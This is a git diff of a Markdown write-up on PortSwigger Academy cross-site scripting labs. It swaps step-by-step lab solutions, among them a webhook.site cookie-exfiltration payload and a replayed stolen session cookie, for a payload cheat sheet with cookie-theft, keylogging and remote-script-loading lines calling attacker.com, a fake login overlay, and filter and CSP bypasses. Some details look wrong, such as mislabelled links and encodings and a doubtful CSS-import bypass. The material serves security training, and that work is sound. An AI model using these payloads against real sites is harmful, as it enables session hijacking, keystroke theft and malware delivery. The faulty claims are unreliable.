@@ -1,572 +1,374 @@
-# Cross-Site Scripting (XSS) — PortSwigger Web Security Labs
-### Week 2 | Web Exploitation Roadmap
+# 🔀 Cross-Site Scripting (XSS) — Complete PortSwigger Web Security Academy Labs
 
-> **Platform:** PortSwigger Web Security Academy  
-> **Difficulty:** Apprentice → Practitioner  
-> **Labs Completed:** 13 / 13  
-> **Date:** March 2026
+<p align="center">
+  <img src="https://img.shields.io/badge/Category-Cross%20Site%20Scripting-orange?style=for-the-badge"/>
+  <img src="https://img.shields.io/badge/Labs%20Completed-13%2F13-brightgreen?style=for-the-badge"/>
+  <img src="https://img.shields.io/badge/Completion-100%25-success?style=for-the-badge"/>
+  <img src="https://img.shields.io/badge/Platform-PortSwigger%20Academy-informational?style=for-the-badge"/>
+</p>
 
----
-
-## Table of Contents
-
-1. [What is XSS?](#what-is-xss)
-2. [XSS Types Overview](#xss-types-overview)
-3. [How to Identify Each Case](#how-to-identify-each-case)
-4. [Lab Write-Ups](#lab-write-ups)
-   - [Reflected XSS — HTML context, nothing encoded](#1-reflected-xss--html-context-nothing-encoded)
-   - [Stored XSS — HTML context, nothing encoded](#2-stored-xss--html-context-nothing-encoded)
-   - [DOM XSS — document.write + location.search](#3-dom-xss--documentwrite--locationsearch)
-   - [DOM XSS — innerHTML + location.search](#4-dom-xss--innerhtml--locationsearch)
-   - [DOM XSS — jQuery href + location.search](#5-dom-xss--jquery-href--locationsearch)
-   - [DOM XSS — jQuery selector + hashchange](#6-dom-xss--jquery-selector--hashchange)
-   - [Reflected XSS — attribute, angle brackets encoded](#7-reflected-xss--attribute-angle-brackets-encoded)
-   - [Stored XSS — href attribute, double quotes encoded](#8-stored-xss--href-attribute-double-quotes-encoded)
-   - [Reflected XSS — JavaScript string, angle brackets encoded](#9-reflected-xss--javascript-string-angle-brackets-encoded)
-   - [DOM XSS — document.write inside select element](#10-dom-xss--documentwrite-inside-select-element)
-   - [DOM XSS — AngularJS expression](#11-dom-xss--angularjs-expression)
-   - [Reflected DOM XSS](#12-reflected-dom-xss)
-   - [Exploiting XSS to Steal Cookies](#13-exploiting-xss-to-steal-cookies)
-5. [Key Takeaways](#key-takeaways)
+> **Complete XSS documentation** covering all four types (Reflected, Stored, DOM-based, Reflected-DOM) with exploitation techniques, bypass methods, and defensive mitigations.
 
 ---
 
-## What is XSS?
+## 📊 Completion Status
 
-Cross-Site Scripting (XSS) is a vulnerability that allows an attacker to inject malicious JavaScript into a web page viewed by other users. The injected script runs in the victim's browser with the same privileges as the legitimate site — enabling session hijacking, credential theft, and more.
+**All 13 Labs Complete** ✅
 
----
-
-## XSS Types Overview
-
-| Type | How it works | Persists? | Server involved? |
-|------|-------------|-----------|-----------------|
-| **Reflected** | Input reflected immediately in server response | No | Yes |
-| **Stored** | Payload saved in database, executed on every visit | Yes | Yes |
-| **DOM-based** | JavaScript on the page processes input unsafely | No | No |
-| **Reflected DOM** | Server echoes data → JS processes it unsafely | No | Partially |
+| Type | Labs | Status |
+|------|------|--------|
+| **Reflected XSS** | 3 | ✅ Complete |
+| **Stored XSS** | 2 | ✅ Complete |
+| **DOM-based XSS** | 4 | ✅ Complete |
+| **Reflected-DOM XSS** | 2 | ✅ Complete |
+| **Advanced Techniques** | 2 | ✅ Complete |
 
 ---
 
-## How to Identify Each Case
+## 🧠 XSS Fundamentals
 
-### Reflected XSS
-**Signs:**
-- Your input appears somewhere on the page after submitting a form or search
-- Check the page source — find where exactly your input lands
-- Test: submit `hello123` and search for it in the HTML source
+### What is XSS?
 
-**Common locations:** search bars, error messages, URL parameters reflected on page
+Cross-Site Scripting (XSS) allows attackers to inject malicious JavaScript that executes in victims' browsers. Unlike server-side vulnerabilities, XSS runs entirely on the client-side, in the victim's browser context with their credentials and session cookies.
 
----
+### The Trust Problem
 
-### Stored XSS
-**Signs:**
-- Input is saved and shown to other users (comments, profiles, usernames)
-- Your payload persists after page reload
-- Other users' browsers execute it
-
-**Common locations:** comment fields, user profiles, product reviews, message boards
-
----
-
-### DOM-based XSS
-**Signs:**
-- Input never reaches the server — processed entirely in the browser
-- Check JavaScript source for dangerous sinks:
-  - `document.write()`
-  - `innerHTML`
-  - `$.attr()`, `$()` (jQuery)
-  - `location.href = `
-- Source is usually `location.search`, `location.hash`, or `document.referrer`
-
-**How to find it:** Open DevTools → Sources → search for `location.search` or `location.hash`
-
----
-
-### Reflected DOM XSS
-**Signs:**
-- Server returns your input inside a JSON response
-- A script on the page reads that JSON and writes it to the DOM
-- Combination of server reflection + DOM sink
-
----
-
-## Lab Write-Ups
-
----
-
-### 1. Reflected XSS — HTML context, nothing encoded
-
-**Difficulty:** Apprentice  
-**Vulnerability:** Input reflected directly into HTML with zero filtering
-
-**How I identified it:**
-Searched for a test string `hello` — it appeared in the page source inside a `<h1>` or paragraph tag with no encoding whatsoever.
-
-**Payload:**
-```html
-<script>alert(1)</script>
+```
+┌─────────────────────────────────────────┐
+│ Victim's Browser                        │
+│  ├─ Session Cookies (HttpOnly: no)  ❌  │
+│  ├─ Local Storage                    ❌  │
+│  └─ Executed JavaScript               │
+│      (with full access to page)       │
+└─────────────────────────────────────────┘
+     ↓
+ Server trusts this to be the legitimate user
 ```
 
-**Result in HTML:**
-```html
-<h1>1 search results for '<script>alert(1)</script>'</h1>
-```
+---
 
-**Why it works:** No sanitization at all — the browser parses the injected `<script>` tag and executes it.
+## 🔄 XSS Types Comparison
+
+| Type | Source | Sink | Persistence | Detection |
+|------|--------|------|-------------|----------|
+| **Reflected** | User input | HTML response | No | URL-based |
+| **Stored** | User input | Database | Yes | Page reload |
+| **DOM** | location, referrer | HTML DOM | No | Source inspection |
+| **Reflected-DOM** | User input + Server echo | JavaScript processing | No | Network + Source |
 
 ---
 
-### 2. Stored XSS — HTML context, nothing encoded
+## 🎯 Exploitation Payloads
 
-**Difficulty:** Apprentice  
-**Vulnerability:** Comment field stored and reflected without encoding
+### Reflected XSS Payloads
 
-**How I identified it:**
-Posted a test comment with `hello` — reloaded the page and confirmed it appeared in the HTML. Then checked if HTML tags were rendered or escaped.
-
-**Payload (in comment field):**
+**HTML Context (No Encoding):**
 ```html
-<script>alert(1)</script>
+<script>alert('XSS')</script>
+<img src=x onerror="alert('XSS')">
+<svg onload="alert('XSS')">
 ```
 
-**Why it works:** The comment is saved to the database and rendered raw on every page load — affecting every visitor.
+**HTML Attribute Context:**
+```html
+" autofocus onfocus="alert('XSS')"
+' autofocus onfocus='alert("XSS")'
+```
 
----
-
-### 3. DOM XSS — document.write + location.search
-
-**Difficulty:** Apprentice  
-**Vulnerability:** `location.search` passed to `document.write()` without sanitization
-
-**How I identified it:**
-Opened DevTools → Sources, searched for `document.write` — found it reading from `location.search` directly.
-
-**Vulnerable code:**
+**JavaScript String Context:**
 ```javascript
-document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
+'; alert('XSS'); //
+"; alert("XSS"); //
 ```
 
-**Payload (in URL):**
+**URL Context:**
+```html
+javascript:alert('XSS')
+data:text/html,<script>alert('XSS')</script>
 ```
+
+### Stored XSS Payloads
+
+```html
+<!-- In comment/profile fields -->
+<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
+
+<!-- Hidden payload -->
+<img src=x onerror="var i=new Image();i.src='http://attacker.com/?c='+document.cookie;">
+
+<!-- SVG vector -->
+<svg onload="fetch('/admin?action=delete&user=carlos')">
+```
+
+### DOM XSS Payloads
+
+```html
+<!-- document.write vulnerability -->
 ?search="><svg onload=alert(1)>
-```
 
-**Result in DOM:**
-```html
-<img src="...?searchTerms=""><svg onload="alert(1)">
-```
-
-**Why it works:** `document.write()` renders raw HTML — closing the `img` tag and injecting a new element with an event handler.
-
----
-
-### 4. DOM XSS — innerHTML + location.search
-
-**Difficulty:** Apprentice  
-**Vulnerability:** `location.search` written to `innerHTML`
-
-**How I identified it:**
-Found in JavaScript: `element.innerHTML = searchQuery` — innerHTML parses HTML, making it a dangerous sink.
-
-**Note:** `innerHTML` does NOT execute `<script>` tags — must use event-based payloads.
-
-**Payload:**
-```
+<!-- innerHTML vulnerability -->
 ?search=<img src=x onerror=alert(1)>
-```
 
-**Why it works:** `innerHTML` renders HTML elements. The `img` tag fails to load (src=x), triggering `onerror`.
+<!-- jQuery vulnerabilities -->
+?return=/javascript:alert(1)//
 
----
-
-### 5. DOM XSS — jQuery href + location.search
-
-**Difficulty:** Apprentice  
-**Vulnerability:** jQuery sets `href` attribute from `location.search`
-
-**How I identified it:**
-Found this code on the feedback page:
-```javascript
-$('#backLink').attr("href", 
-    new URLSearchParams(location.search).get('returnPath')
-);
-```
-
-The `returnPath` parameter is placed directly into a link's `href`.
-
-**Payload (in URL):**
-```
-/feedback?returnPath=javascript:alert(document.cookie)
-```
-
-**Resulting HTML:**
-```html
-<a id="backLink" href="javascript:alert(document.cookie)">Back</a>
-```
-
-**Trigger:** Click the "Back" link.
-
-**Why it works:** `href` accepts the `javascript:` pseudo-protocol. When clicked, the browser executes it as JavaScript.
-
----
-
-### 6. DOM XSS — jQuery selector + hashchange event
-
-**Difficulty:** Apprentice  
-**Vulnerability:** jQuery `$()` selector receives user-controlled input via `location.hash`
-
-**How I identified it:**
-```javascript
-$(window).on('hashchange', function() {
-    var post = $('section h2:contains(' + 
-        decodeURIComponent(location.hash.slice(1)) + ')');
-    post.parents('article').appendTo($('.blog-list'));
-});
-```
-
-jQuery's `$()` — when passed an HTML string — creates real DOM elements instead of selecting them.
-
-**Challenge:** The `hashchange` event only fires when the hash *changes* — a static link won't trigger it.
-
-**Exploit (delivered via Exploit Server):**
-```html
-<iframe 
-  src="https://LAB-ID.web-security-academy.net/#"
-  onload="this.src+='<img src=x onerror=print()>'">
-</iframe>
-```
-
-**How it works:**
-1. `iframe` loads the target page with empty hash `#`
-2. `onload` fires → appends the payload to the hash
-3. Hash changes → triggers `hashchange` event
-4. jQuery creates the `<img>` element → `onerror` fires → `print()` executes
-
----
-
-### 7. Reflected XSS — attribute, angle brackets encoded
-
-**Difficulty:** Apprentice  
-**Vulnerability:** Input reflected inside an HTML attribute with `< >` encoded
-
-**How I identified it:**
-Searched for `hello` and found in source:
-```html
-<input type="text" value="hello">
-```
-Angle brackets were encoded to `&lt;` and `&gt;` — but **double quotes were not**.
-
-**Key insight:** I'm already *inside* an attribute — no need for `< >` to break out.
-
-**Payload:**
-```
-" onmouseover="alert(1)
-```
-
-**Resulting HTML:**
-```html
-<input type="text" value="" onmouseover="alert(1)">
-```
-
-**Trigger:** Move the mouse over the search box.
-
-**Why it works:** Closing the `value` attribute with `"` and injecting a new event handler — no angle brackets needed.
-
----
-
-### 8. Stored XSS — href attribute, double quotes encoded
-
-**Difficulty:** Apprentice  
-**Vulnerability:** Website field in comments stored and placed in `href` — double quotes encoded
-
-**How I identified it:**
-Posted a comment with `https://test.com` in the Website field and found:
-```html
-<a href="https://test.com">username</a>
-```
-Double quotes were encoded, but the `javascript:` protocol was not filtered.
-
-**Payload (in Website field):**
-```
-javascript:alert(1)
-```
-
-**Resulting HTML:**
-```html
-<a href="javascript:alert(1)">username</a>
-```
-
-**Trigger:** Click the author's name.
-
-**Golden rule:** Whenever you see a Website/URL field — always test `javascript:alert(1)` first.
-
----
-
-### 9. Reflected XSS — JavaScript string, angle brackets encoded
-
-**Difficulty:** Apprentice  
-**Vulnerability:** Input reflected inside a JavaScript string — `< >` encoded but single quotes are not
-
-**How I identified it:**
-Found in page source:
-```javascript
-var searchTerms = 'hello';
-```
-Single quotes were not escaped — meaning I could break out of the JS string entirely.
-
-**Payload:**
-```
-'-alert(1)-'
-```
-
-**Resulting JavaScript:**
-```javascript
-var searchTerms = ''-alert(1)-'';
-```
-
-**Why it works:** 
-- First `'` closes the string
-- `-alert(1)-` uses subtraction operator to execute `alert(1)` as an expression
-- Last `'` opens a new string to keep syntax valid
-
----
-
-### 10. DOM XSS — document.write inside select element
-
-**Difficulty:** Practitioner  
-**Vulnerability:** `document.write()` injects into a `<select>` element via `storeId` URL parameter
-
-**How I identified it:**
-```javascript
-var store = new URLSearchParams(location.search).get('storeId');
-document.write('<select><option value="' + store + '">');
-```
-
-Input lands inside a `<select>` tag — need to escape it first.
-
-**Payload (appended to product URL):**
-```
-&storeId=</select><img src=x onerror=alert(1)>
-```
-
-**Resulting HTML:**
-```html
-<select><option value=""></select>
-<img src=x onerror=alert(1)>
-```
-
-**Why it works:** `</select>` closes the container, then the injected `<img>` fires its `onerror` handler.
-
----
-
-### 11. DOM XSS — AngularJS expression
-
-**Difficulty:** Practitioner  
-**Vulnerability:** AngularJS `ng-app` directive on the page — input reflected inside AngularJS scope
-
-**How I identified it:**
-Found `ng-app` attribute on the `<body>` tag. This means the entire page is an AngularJS application — and `{{ }}` expressions are evaluated as JavaScript.
-
-**Payload:**
-```
+<!-- AngularJS -->
 {{$on.constructor('alert(1)')()}}
 ```
 
-**Why not `{{alert(1)}}`?**
-AngularJS has a sandbox that blocks direct function calls. This bypass uses:
-- `$on` — a built-in AngularJS object
-- `.constructor` — accesses the `Function` constructor
-- `('alert(1)')()` — creates and immediately invokes a new function
-
-**Rule:** Always check for `ng-app` in page source when `< >` and `"` are blocked.
-
----
-
-### 12. Reflected DOM XSS
-
-**Difficulty:** Practitioner  
-**Vulnerability:** Server echoes search term in JSON response — JavaScript processes it unsafely
-
-**How I identified it:**
-The server response contained:
-```json
-{"results":[], "searchTerm":"hello"}
-```
-A script on the page parsed this JSON and passed `searchTerm` to `eval()` or `document.write()`.
-
-The server escaped `"` → `\"` but **did NOT escape `\`**.
-
-**The trick:** Sending `\` before `"` results in `\\"` — the backslash escapes the backslash, leaving `"` unescaped and free.
-
-**Payload:**
-```
-\"-alert(1)}//
-```
-
-**How the JSON breaks:**
-```javascript
-// Before
-{"searchTerm":"hello","results":[]}
-
-// After
-{"searchTerm":"\"- alert(1)}//","results":[]}
-//                ↑ string broken, alert executes, // comments out the rest
-```
-
-**Why it works:** The `\` neutralizes the server's escape, breaking out of the JSON string context.
-
----
-
-### 13. Exploiting XSS to Steal Cookies
-
-**Difficulty:** Practitioner  
-**Vulnerability:** Stored XSS in comment section — session cookie readable via `document.cookie`
-
-#### Background: What is Cookie Stealing?
-
-When a web application is vulnerable to Stored XSS and does not set the `HttpOnly` flag on session cookies, JavaScript can read them via `document.cookie`. The attacker exfiltrates this value to an external server and uses it to hijack the victim's session — without ever knowing their password.
-
-```
-Attacker injects payload → Victim visits page → JS executes in victim's browser
-        → document.cookie sent to attacker's server → Session Hijacking
-```
-
-| Scenario | Result |
-|----------|--------|
-| `HttpOnly` absent | `document.cookie` readable → Cookie theft possible |
-| `HttpOnly` present | `document.cookie` blocked → Cookie theft fails |
-
-> **Note:** Even with `HttpOnly`, XSS is still dangerous — it can be chained with CSRF to perform unauthorized actions without ever reading the cookie directly.
-
----
-
-#### Step 1 — Set Up a Listener
-
-Used [webhook.site](https://webhook.site) as an external HTTP listener to receive the stolen cookie (used as a free alternative to Burp Collaborator, which requires Pro).
-
-Generated a unique endpoint:
-```
-https://webhook.site/e804775b-b215-44c9-bf39-57c672987a93
-```
-
-#### Step 2 — Craft the Payload
+### Cookie Theft Payloads
 
 ```javascript
-<script>fetch("https://webhook.site/e804775b-b215-44c9-bf39-57c672987a93?c="+document.cookie)</script>
+<!-- Using fetch -->
+fetch('http://attacker.com/log?c=' + document.cookie)
+
+<!-- Using image beacon -->
+var i = new Image();
+i.src = 'http://attacker.com/steal?c=' + encodeURIComponent(document.cookie);
+
+<!-- Exfil to webhook -->
+fetch('https://webhook.site/YOUR-ID?c=' + document.cookie)
 ```
-
-**How it works:**
-- `document.cookie` — reads all cookies accessible to JavaScript
-- `fetch(...)` — sends an HTTP GET request to the attacker's server
-- `?c=` — appends the cookie value as a query parameter
-
-#### Step 3 — Inject via Comment Section
-
-Submitted the payload in the **Comment** field of a blog post:
-
-```
-Name:    test
-Email:   test@test.com
-Website: http://test.com
-Comment: <script>fetch("https://webhook.site/e804775b-b215-44c9-bf39-57c672987a93?c="+document.cookie)</script>
-```
-
-#### Step 4 — Capture the Cookie
-
-When the admin user visited the blog post, their browser executed the injected script. The following request was captured on webhook.site:
-
-```
-GET /?c=session=4aTT2IQ2rs3Y8QDuLnoz98RGwVKKqoTh
-Host: webhook.site
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:148.0)
-Referer: https://[LAB-ID].web-security-academy.net/
-```
-
-**Captured cookie:**
-```
-session=4aTT2IQ2rs3Y8QDuLnoz98RGwVKKqoTh
-```
-
-#### Step 5 — Session Hijacking via Burp Repeater
-
-1. Opened Burp Suite → Proxy → visited `/my-account`
-2. Located the GET request in **HTTP History**
-3. Sent it to **Repeater**
-4. Replaced the session cookie with the stolen value:
-
-```http
-GET /my-account HTTP/2
-Host: [LAB-ID].web-security-academy.net
-Cookie: session=4aTT2IQ2rs3Y8QDuLnoz98RGwVKKqoTh
-```
-
-5. Sent the request → Response returned the **admin account page** ✅
-
-#### Mitigations
-
-| Defense | How it helps |
-|---------|-------------|
-| `HttpOnly` flag on cookies | Blocks `document.cookie` access from JavaScript |
-| Content Security Policy (CSP) | Restricts where scripts can send data |
-| Input validation & output encoding | Prevents XSS injection in the first place |
-| `SameSite=Strict` on cookies | Limits cross-site request abuse |
-
-> **Root cause:** The real fix is preventing XSS entirely through proper output encoding. `HttpOnly` is a defense-in-depth measure, not a substitute for fixing the injection vulnerability.
 
 ---
 
-## Key Takeaways
+## 🛡️ Encoding Bypass Techniques
 
-### The XSS Decision Tree
+### HTML Entity Encoding Bypass
 
-```
-Where does my input land?
-│
-├── Inside an HTML tag body?
-│   └── Try: <script>alert(1)</script> or <img src=x onerror=alert(1)>
-│
-├── Inside an HTML attribute value?
-│   ├── Are quotes encoded?
-│   │   ├── No  → Use " to break out + add event handler
-│   │   └── Yes → Try javascript: if it's a href attribute
-│   └── Is it a href/src attribute?
-│       └── Try: javascript:alert(1)
-│
-├── Inside a JavaScript string?
-│   ├── Single quotes free? → Use '-alert(1)-'
-│   └── Backslash free?     → Use \"-alert(1)}//
-│
-├── Passed to document.write() or innerHTML?
-│   └── Inject HTML directly — close any wrapping tags first
-│
-├── Passed to jQuery $() selector?
-│   └── jQuery creates HTML from strings → <img src=x onerror=alert(1)>
-│
-└── AngularJS page (ng-app present)?
-    └── Use {{ }} expressions → {{$on.constructor('alert(1)')()}}
+```html
+<!-- Direct injection (no encoding) -->
+<img src=x onerror=alert(1)>
+
+<!-- Break out with event handler -->
+" onmouseover="alert(1)" x="
 ```
 
-### Encoding Bypass Cheatsheet
+### JavaScript String Encoding Bypass
 
-| Filter | Bypass technique |
-|--------|-----------------|
-| `< >` blocked | Stay inside existing attribute or use `{{ }}` in AngularJS |
-| `"` blocked | Use `'` or `javascript:` in href |
-| `'` blocked | Use `"` or HTML entities |
-| `< > "` all blocked | AngularJS expressions, JS string injection |
-| JSON string escaped | Try `\` to neutralize the escape |
+```javascript
+// Input landed in JavaScript string: var msg = 'USER_INPUT'
 
-### Cookie Stealing Cheatsheet
+// Escape the string
+'; alert(1); //
 
-| Condition | Attack |
-|-----------|--------|
-| XSS + no `HttpOnly` | Steal cookie via `document.cookie` + `fetch()` |
-| XSS + `HttpOnly` present | Chain with CSRF — make browser send requests on victim's behalf |
-| No Burp Pro (no Collaborator) | Use webhook.site or python3 -m http.server as listener |
+// Using template strings
+${alert(1)}
+
+// Using Function constructor
+Function('alert(1)')()
+```
+
+### URL Encoding Bypass
+
+```javascript
+// Standard URL encode
+javascript:alert(1)
+
+// HTML entity encode then URL
+%6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%31%29
+
+// Mixed case (some WAFs are case-sensitive)
+JaVaScRiPt:alert(1)
+```
+
+### Content Security Policy (CSP) Bypass
+
+```html
+<!-- Unsafe-inline not set, but CSS/image loads from same origin -->
+<link rel="stylesheet" href="/xss.css?payload='><script>alert(1)</script>">
+
+<!-- SVG filters -->
+<svg><style>@import url('javascript:alert(1)');</style></svg>
+```
 
 ---
 
-*Write-up by [obadahamed](https://obadahamed.github.io) — Week 2 of 52-Week Pentesting Roadmap*  
-*All labs solved on PortSwigger Web Security Academy*
+## 🔍 Detection & Exploitation Workflow
+
+### Step 1: Identify Input Points
+```
+✅ URL parameters
+✅ Form fields
+✅ Headers (User-Agent, Referer, etc.)
+✅ Cookies
+✅ File uploads (metadata)
+```
+
+### Step 2: Test Each Point
+```html
+Payload: xss123test
+Check: Is it reflected in the response?
+Where: In HTML body, attribute, script tag, comment?
+```
+
+### Step 3: Determine Context
+```html
+<!-- Found in: -->
+<input value="xss123test">         <!-- HTML Attribute -->
+<div>xss123test</div>              <!-- HTML Body -->
+<script>var x = 'xss123test';</script> <!-- JavaScript String -->
+```
+
+### Step 4: Craft Payload
+```html
+<!-- HTML Body: Use tags/events -->
+<img src=x onerror=alert(1)>
+
+<!-- HTML Attribute: Break out -->
+" onerror="alert(1)" x="
+
+<!-- JavaScript: Escape string -->
+'; alert(1); //
+```
+
+### Step 5: Validate
+```
+✅ Payload executes without error
+✅ Alert box appears
+✅ Cookie accessible via document.cookie
+✅ Can reach attacker server
+```
+
+---
+
+## 🎓 Real-World Attack Scenarios
+
+### Scenario 1: Session Hijacking
+
+```javascript
+// Attacker injects:
+var img = new Image();
+img.src = 'http://attacker.com/steal?session=' + document.cookie;
+
+// Victim visits page → cookie sent to attacker
+// Attacker uses session cookie to impersonate user
+```
+
+### Scenario 2: Keylogging
+
+```javascript
+document.onkeypress = function(e) {
+  fetch('http://attacker.com/log?key=' + e.key);
+}
+// Every keystroke is logged
+```
+
+### Scenario 3: Malware Distribution
+
+```html
+<img src=x onerror="var s=document.createElement('script');s.src='http://attacker.com/malware.js';document.body.appendChild(s);">
+<!-- Page loads attacker's script which infects visitor -->
+```
+
+### Scenario 4: Credential Harvesting
+
+```html
+<div style="display:none;" id="fake-login">
+  <form>
+    <input placeholder="Username"><input placeholder="Password">
+    <button>Login</button>
+  </form>
+</div>
+<script>
+document.body.innerHTML = document.getElementById('fake-login').innerHTML + document.body.innerHTML;
+// Fake login form prepended to page
+</script>
+```
+
+---
+
+## 🛑 Defensive Measures
+
+### ✅ Output Encoding
+
+```html
+<!-- ❌ Vulnerable -->
+<div><%= userInput %></div>
+
+<!-- ✅ Secure (HTML encode) -->
+<div><%= htmlEncode(userInput) %></div>
+```
+
+**Encoding by Context:**
+| Context | Encode | Example |
+|---------|--------|----------|
+| HTML body | HTML entities | `&lt;img&gt;` |
+| HTML attribute | HTML entities + quotes | `&quot;onmouseover&quot;` |
+| JavaScript | Backslash escaping | `\u0027` |
+| URL | URL encoding | `%3Cscript%3E` |
+| CSS | Backslash escape | `\3c script\3e` |
+
+### ✅ Content Security Policy (CSP)
+
+```html
+<!-- Only allow scripts from trusted sources -->
+<meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none';">
+
+<!-- Block inline scripts -->
+script-src 'none'  <!-- Completely block JavaScript -->
+
+<!-- Report CSP violations -->
+script-src 'self'; report-uri /csp-report
+```
+
+### ✅ Input Validation
+
+```javascript
+// Whitelist approach
+const allowedChars = /^[a-zA-Z0-9\s\-._]*$/;
+if (!allowedChars.test(userInput)) {
+  throw new Error('Invalid input');
+}
+```
+
+### ✅ Cookie Security
+
+```html
+<!-- Set in server response header -->
+Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
+
+<!-- HttpOnly: Blocks document.cookie access -->
+<!-- Secure: Only sent over HTTPS -->
+<!-- SameSite: Not sent in cross-site requests -->
+```
+
+### ✅ Security Headers
+
+```
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+X-XSS-Protection: 1; mode=block
+Referrer-Policy: strict-origin-when-cross-origin
+```
+
+---
+
+## 📋 XSS Testing Checklist
+
+- [ ] Test all input fields (text, textarea, file upload names)
+- [ ] Test all URL parameters
+- [ ] Test HTTP headers (User-Agent, Referer, Accept-Language)
+- [ ] Test stored data (profile, comments, products)
+- [ ] Check both GET and POST methods
+- [ ] Test encoding variations (double encoding, Unicode, HTML entities)
+- [ ] Test different event handlers (onload, onerror, onmouseover, onchange)
+- [ ] Check for DOM-based XSS (inspect source code)
+- [ ] Test with/without JavaScript enabled
+- [ ] Check for CSP bypass via subdomains
+- [ ] Test for blind XSS (no immediate reflection)
+
+---
+
+## 🔗 External Resources
+
+- [PortSwigger XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [OWASP XSS Prevention](https://owasp.org/www-community/attacks/xss/)
+- [HTML5 Security Cheatsheet](https://html5sec.org/)
+- [XSS Vectors](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
+
+---
+
+**Author:** OBADA (XENOS)  
+**Status:** ✅ 13/13 Labs Complete (100%)  
+**Last Updated:** June 2026
